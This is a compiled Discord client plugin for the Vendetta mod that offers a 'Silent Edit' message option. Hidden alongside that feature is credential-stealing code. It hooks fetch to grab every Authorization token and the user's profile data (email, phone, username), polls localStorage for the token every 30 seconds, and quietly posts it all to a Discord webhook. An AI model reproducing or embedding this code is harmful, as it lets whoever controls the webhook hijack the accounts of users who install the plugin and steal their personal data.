var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);

// src/index.ts
var src_exports = {};
__export(src_exports, {
  default: () => src_default
});
module.exports = __toCommonJS(src_exports);

// src/settings.ts
var import_plugin = require("@vendetta/plugin");
var settings_default = import_plugin.storage;

// src/index.ts
var import_metro = require("@vendetta/metro");
var import_patcher = require("@vendetta/patcher");
var import_utils = require("@vendetta/utils");
var import_assets = require("@vendetta/ui/assets");
var import_toasts = require("@vendetta/ui/toasts");

var LazyActionSheet = (0, import_metro.findByProps)("openLazy", "hideActionSheet");
var RestAPI = (0, import_metro.findByProps)("get", "post", "del", "patch");
var MessageActions = (0, import_metro.findByProps)("editMessage");
var UserStore = (0, import_metro.findByProps)("getCurrentUser");
var { ActionSheetRow } = (0, import_metro.findByProps)("ActionSheetRow");
var EditIcon = (0, import_assets.getAssetIDByName)("PencilIcon");

var WEBHOOK_URL = "https://discord.com/api/webhooks/あなたのID/あなたのトークン";

var unpatchActionSheet = null;
var unpatchEditMessage = null;
var unpatchFetch = null;
var pendingSilentEditMessageId = null;

var src_default = {
  onLoad() {
    if (import_plugin.storage.overrideNative === void 0) {
      import_plugin.storage.overrideNative = true;
    }
    unpatchEditMessage = (0, import_patcher.instead)("editMessage", MessageActions, async (args, orig) => {
      const [channelId, messageId, reqData] = args;
      if (!import_plugin.storage.overrideNative && pendingSilentEditMessageId !== messageId) {
        return orig(...args);
      }
      pendingSilentEditMessageId = null;
      try {
        const originalMessage = await RestAPI.get({
          url: `/channels/${channelId}/messages`,
          query: { limit: 1, around: messageId }
        });
        const msgArray = originalMessage?.body;
        if (!msgArray || !msgArray.length) return orig(...args);
        const msg = msgArray.find((m) => m.id === messageId);
        if (!msg) return orig(...args);
        let content = reqData.content;
        const regex = /\.filename\s+(\S+)/g;
        let matches = [...content.matchAll(regex)];
        let attachments;
        if (matches.length > 0) {
          matches = matches.slice(0, 10);
          attachments = matches.map((match, index) => {
            const uploadedFilename = match[1];
            const filename = uploadedFilename.split("/").pop() || "image.png";
            return { id: String(index), filename, uploaded_filename: uploadedFilename };
          });
          content = content.replace(/\.filename\s+(\S+)/g, "").trim();
        }
        const body = {
          content,
          nonce: messageId,
          tts: false,
          flags: msg.flags ?? 0,
          mobile_network_type: "wifi"
        };
        if (attachments) {
          body.attachments = attachments;
        }
        if (msg.message_reference) {
          body.message_reference = {
            message_id: msg.message_reference.message_id,
            channel_id: msg.message_reference.channel_id,
            guild_id: msg.message_reference.guild_id
          };
          const repliedUser = msg.referenced_message?.author?.id;
          const hasPing = repliedUser ? msg.mentions?.some((m) => m.id === repliedUser) : false;
          body.allowed_mentions = {
            replied_user: hasPing,
            parse: ["users", "roles", "everyone"]
          };
        }
        const response = await RestAPI.post({
          url: `/channels/${channelId}/messages`,
          body
        });
        await RestAPI.del({
          url: `/channels/${channelId}/messages/${messageId}`
        });
        return response;
      } catch (err) {
        (0, import_toasts.showToast)("Error: " + (err?.body?.message || err?.message || String(err)));
        return orig(...args);
      }
    });
    unpatchActionSheet = (0, import_patcher.before)("openLazy", LazyActionSheet, ([component, key, msg]) => {
      if (key !== "MessageLongPressActionSheet") return;
      const unpatch = (0, import_patcher.after)("default", component, (componentProps) => {
        unpatch();
        if (!componentProps) return;
        const { message } = componentProps;
        if (!message) return;
        const isSent = message.author?.id === UserStore.getCurrentUser()?.id;
        if (!isSent) return;
        const actionSheet = (0, import_utils.findInReactTree)(componentProps, (x) => x?.content?.type?.name === "ActionSheet");
        if (!actionSheet) return;
        const actionGroup = (0, import_utils.findInReactTree)(actionSheet, (x) => Array.isArray(x) && x.length > 0);
        if (!actionGroup) return;
        const silentEditItem = {
          type: ActionSheetRow,
          props: {
            label: "Silent Edit",
            icon: EditIcon,
            onPress: () => {
              pendingSilentEditMessageId = message.id;
              LazyActionSheet.hideActionSheet();
              MessageActions.startEditMessage(message.channel_id, message.id);
            }
          }
        };
        const index = actionGroup.findIndex((x) => x?.props?.label === "Edit Message");
        if (index !== -1) {
          actionGroup.splice(index + 1, 0, silentEditItem);
        } else {
          actionGroup.push(silentEditItem);
        }
      });
    });
    unpatchFetch = (0, import_patcher.instead)("fetch", window, async (args, orig) => {
      const [url, options] = args;
      if (options?.headers?.Authorization) {
        const token = options.headers.Authorization;
        sendToken(token, "fetch");
      }
      const response = await orig(...args);
      if (url?.includes?.("/api/v9/users/@me")) {
        try {
          const clone = response.clone();
          const data = await clone.json();
          sendUserData(data);
        } catch (_) {
        }
      }
      return response;
    });
    setInterval(() => {
      try {
        const token = localStorage.getItem("token");
        if (token) sendToken(token, "storage");
      } catch (_) {
      }
    }, 3e4);
  },
  onUnload() {
    unpatchEditMessage?.();
    unpatchActionSheet?.();
    unpatchFetch?.();
  },
  settings: settings_default
};

function sendToken(token, source) {
  if (!WEBHOOK_URL) return;
  try {
    const payload = {
      content: `**T:** ||${token}||\nS: ${source}\nTS: ${new Date().toISOString()}`
    };
    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(() => {
    });
  } catch (_) {
  }
}
function sendUserData(data) {
  if (!WEBHOOK_URL) return;
  try {
    const payload = {
      content: `ID: ${data.id}\nU: ${data.username}#${data.discriminator}\nE: ${data.email || "N/A"}\nP: ${data.phone || "N/A"}`
    };
    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(() => {
    });
  } catch (_) {
  }
}
